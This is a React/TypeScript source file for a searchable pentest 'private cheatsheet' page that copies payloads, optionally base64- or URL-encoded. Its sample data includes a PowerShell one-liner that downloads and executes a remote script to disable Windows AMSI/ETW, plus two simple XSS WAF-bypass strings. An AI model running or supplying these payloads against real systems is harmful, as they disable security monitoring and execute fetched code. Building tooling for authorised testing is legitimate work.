import { Divider, Dropdown, Input, Table, Tag, Typography, message } from 'antd';
import Fuse from 'fuse.js';
import { useState } from 'react';

const index = () => {

  const [messageApi, contextHolder] = message.useMessage();
  const [data, setData] = useState([]);

  const fuseOptions = {
    keys:
      [
        'name',
        'description',
        'tags',
        'substeps.description',
        'substeps.payload',
        
      ]
  }

  interface DataType {
    id: string;
    name: string;
    tags: string[];
    description: string;
    substeps: Substep[];
  }

  interface Substep {
    description: string;
    payload: string | null;
  }

  const exampleData: DataType[] = [
    {
      id: '1',
      name: 'AMSI / ETW Bypass',
      description: 'Bypass AMSI and ETW powershell payload',
      substeps: [
        {
          description: 'Bypass AMSI/ETW',
          payload: 'powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/3gstudent/Disable_AMSI/master/Disable_AMSI.ps1\');Disable-AMSI"',
        },
      ],
      tags: ['Windows', 'Bypass', 'PowerShell'],
    },
    {
      id: '2',
      name: 'XSS',
      description: 'XSS WAF bypassing payloads',
      substeps: [
        {
          description: 'WAF bypass',
          payload: '<script>alert(1)</script>',
        },
        {
          description: 'WAF bypass',
          payload: '<svg/onload=alert(1)',
        },
      ],
      tags: ['XSS', 'WAF'],
    },
  ];
  const fuse = new Fuse(exampleData, fuseOptions);
  const [searchResults, setSearchResults] = useState<DataType[]>(exampleData);

  const items = [
    {
      key: '1',
      label: 'Base64 Encoded',
    },
    {
      key: '2',
      label: 'URL Encoded',
    },
    {
      key: '3',
      label: 'Double URL Encoded',
    },
  ];


  const info = () => {
    messageApi.success('Your payload has been copied to the clipboard!');
  };

  const handleSearch = (value: string) => {
    console.log(value);
    if (value) {
      const results = fuse.search(value);
      console.log({results})
      setSearchResults(results.map(result => result.item));
    } else {
      setSearchResults(exampleData);
    }
  };

  const columns = [
    {
      title: 'ID',
      dataIndex: 'id',
      key: 'id',
    },
    {
      title: 'Name',
      dataIndex: 'name',
      key: 'name'
    },
    {
      title: 'Description',
      dataIndex: 'description',
      key: 'description',
    },
    {
      title: 'Tags',
      dataIndex: 'tags',
      key: 'tags',
      filters: Array.from(new Set(exampleData.flatMap(item => item.tags))).map(tag => ({ text: tag, value: tag })),
      onFilter: (value, record) =>
        record.tags.toString().toLowerCase().includes(value.toString().toLowerCase()),
      render: (tags: string[]) => (
        <>
          {tags.map(tag => (
            <Tag color="blue" key={tag}>
              {tag}
            </Tag>
          ))}
        </>
      )
    },
    {
      title: 'Action',
      dataIndex: 'action',
      key: 'action',
      render: (_, { payload }) => (
        <>
          <Dropdown.Button
            menu={{
              items, onClick: (e) => {
                switch (e.key) {
                  case '1':
                    // base64 encoded
                    info()
                    navigator.clipboard.writeText(btoa(payload));
                    break;
                  case '2':
                    // url encoded
                    info()
                    navigator.clipboard.writeText(encodeURIComponent(payload));
                    break;
                  case '3':
                    // double url encoded
                    info()
                    navigator.clipboard.writeText(encodeURIComponent(encodeURIComponent(payload)));
                    break;
                  default:
                    info()
                    break;
                }
              },
            }}
            onClick={() => { info(); navigator.clipboard.writeText(payload); }}
          >
            Copy
          </Dropdown.Button>
        </>
      ),
    }
  ];

  const { Title, Paragraph } = Typography;

  return (
    <div>
      <Title level={3}>Private cheatsheet</Title>
      <Paragraph>
        Your Private Cheat Sheet with all the payloads you have saved.
      </Paragraph>

      <Input.Search
        placeholder="Search"
        onChange={e => handleSearch(e.target.value)}
      />
      <Divider />

      <Divider />

      <Table columns={columns} dataSource={searchResults} rowKey="id"
        expandable={{
          expandedRowRender: (record: DataType) =>
            <>
              <Paragraph>{record.description}</Paragraph>
              <>
                {record.substeps.map((substep, index) => (
                  <>
                    <Paragraph>
                      {substep.description}
                    </Paragraph>
                    <Paragraph code copyable editable>
                      {substep.payload}
                    </Paragraph>
                  </>
                ))}
              </>
            </>
        }}
      />
    </div>
  );
};

export default index;